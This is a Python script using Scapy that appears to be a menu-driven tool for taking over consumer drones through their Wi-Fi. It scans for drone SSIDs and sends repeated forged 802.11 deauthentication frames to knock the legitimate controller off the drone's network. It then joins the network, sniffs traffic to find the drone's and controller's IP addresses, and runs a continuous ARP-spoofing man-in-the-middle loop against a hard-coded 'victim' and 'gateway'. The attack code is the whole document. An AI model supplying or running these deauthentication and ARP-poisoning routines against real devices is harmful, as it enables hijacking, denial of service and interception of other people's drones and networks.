from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import os
from time import sleep
import threading
import signal
import subprocess

conf.use_pcap = True

AP = []
SSIDlist = []

def PrintList():
	print('\n\nWIFI-LIST')
	for i, ssid in enumerate(SSIDlist):
		print(i,':',ssid);

def ssid_finder(pkt):
	if pkt.haslayer(Dot11Beacon):
		ssid = pkt[Dot11Elt].info
		if ssid and not ({ssid.decode()} in SSIDlist):
			print(f"SSID: {ssid.decode()}")
			AP.append((pkt.addr1, pkt.addr2))
			SSIDlist.append({ssid.decode()})

def start_airport(sel):
	global airport_process
	airport_process = subprocess.Popen(['sudo', 'airport', 'en0', 'sniff', str(sel)], preexec_fn=os.setsid)
#packet

def find_WIFI():
	command = ['airport' '-s']
	result = subprocess.run(command, capture_output=True, text=True)
	output = result.stdout.strip().split('\n')[1:]

	wifi_networks = []
	for line in output:
		wifi_info = line.split()
		ssid = wifi_info[0]
		wifi_networks.append(ssid)

	return wifi_networks

def stop_airport():
	global airport_process
	os.killpg(os.getpgid(airport_process.pid), signal.SIGTERM)
	print('airport is stopped!')

def sniff_packets():
	packet = sniff(iface="en0", prn=ssid_finder, monitor=True, timeout=10)
	print(str(packet))

def findDrone(sel):
	airport_thread = threading.Thread(target=start_airport, args=(sel,))
	airport_thread.start()
	sleep(1.5)
	sniff_thread = threading.Thread(target=sniff_packets)
	sniff_thread.start()

	sniff_thread.join()  # Wait for the sniff_thread to finish
	stop_airport()  # Stop the airport command

	airport_thread.join()  # Wait for the airport_thread to finish
	
	PrintList()
	sel = int(input('Select number to connect a Drone!'))
	print('You select', SSIDlist[sel])
	return sel

def Deauth(sel):
	client = AP[sel][0]
	wl = AP[sel][1]
	print(client, wl, SSIDlist[sel])
	print('Sending Deauth packet!')
	pkt = RadioTap()/Dot11(type = 0, subtype = 12,addr1=client, addr2=wl, addr3=wl)/Dot11Deauth(reason=7)
	sendp(pkt, iface = "en0", inter=0.1, loop=1, count=1000)

def DeauthAttack(channel, sel):
	airport_thread = threading.Thread(target=start_airport, args=(channel,))
	airport_thread.start()
	sleep(10)

	deauth_thread = threading.Thread(target=Deauth, args=(sel,))
	deauth_thread.start()

	deauth_thread.join()
	stop_airport()

	airport_thread.join()
	print("Ended Deauth-Attack!")

def connectWIFI(sel):
	SSID = SSIDlist[sel]
	password = str(input('Input WIFI password!'))
	cmd = f"networksetup -setairportnetwork en0 {SSID} {password}"
	result = subprocess.run(cmd, shell=True, capture_output=True)
	if result.returncode == 0:
		print(f"Connected to {SSID} successfully!")
	else:
		print("Failed to connect to Wi-Fi")


def connectDrone():#WIFI connect
	channel = int(input('Select WIFI Channel!'))  
	sel = findDrone(channel)
	ans = input('Do you want Deauth attack?(y/n)')
	if ans == 'y':
		DeauthAttack(channel, sel)
	connectWIFI(sel)


#find IP

def get_my_ip():
	return get_if_addr(conf.iface)

def showPacket(packet):
	src_ip = packet[0][1].src
	dst_ip = packet[0][1].dst
	prt = packet[0][1].proto
	#if(proto == 17)# Code 17 is UDP
	return src_ip, dst_ip

def sniffIP():#Get drone's IP and controller's IP!
	my_ip = get_my_ip()
	filter = f'ip and not src {my_ip} and not dst {my_ip}'
	captured_packets = sniff(filter = filter, prn = showPacket, count = 1)
	ips = [showPacket(packet) for packet in captured_packets]
	return ips[0]

#About ARPSpoofing!

def getMAC(ip):
	ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout = 5, retry = 3)
	for s, r in ans:
		return r.sprintf('%Ether.src%')

def poisonARP(scrip, targetip, targetmac):
	arp = ARP(op=2, psrc=scrip, pdst=targetip, hwdst=targetmac)
	send(arp)

def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
	arp1 = ARP(op = 2, pdst=victimip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc=gatewaymac)
	arp2 = ARP(op = 2, pdst=gatewayip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc=victimmac)
	send(arp1, count=3)
	send(arp2, count=3)

def ARPSpoof(gatewayip, victimip):

	gatewaymac = getMAC(gatewayip)
	victimmac = getMAC(victimip)

	if (victimmac == None) or (gatewaymac == None):
		print("Can't find MAC address!")
		return
	try:
		while True:
			poisonARP(gatewayip, victimip, victimmac)
			poisonARP(victimip, gatewayip, gatewaymac)
			sleep(3)
	except KeyboardInterrupt:
		restoreARP(victimip, gatewayip, victimmac, gatewaymac)
		print('ARP Spoofing finish... Restored ARP table....')

#About main

if __name__ == '__main__':
	print('1. connect Drone!\n2. Sniff IP!\n3. ARP Spoofing!')
	print('4. Print WIFI List!\n5. Print IP!')
	print('6. Deauth Attack!\n7. Get my ip!\n8. Set IP!')
	print('0. Exit!')
	gateway = '192.168.4.2'
	victim = '192.168.4.1'
	while(1):
		mode = int(input('Select your mode!'))
		if(mode == 1):
			connectDrone()
		elif(mode == 2):
			test = sniffIP()
			gateway = test[0]
			print(test)
		elif(mode == 3):
			ARPSpoof(gateway, victim)
		elif(mode == 4):
			PrintList()
		elif(mode == 5):
			print(gateway, victim)
		elif(mode == 6):
			sel = int(input('Select AP to send deauth packet'))
			Deauth(sel)
		elif(mode == 7):
			ip = get_my_ip()
			print(ip)
		elif(mode == 8):
			gateway = str(input('Insert gateway IP!'))
			victim = str(input('Insert victim IP'))	
		elif(mode == 0):
			break
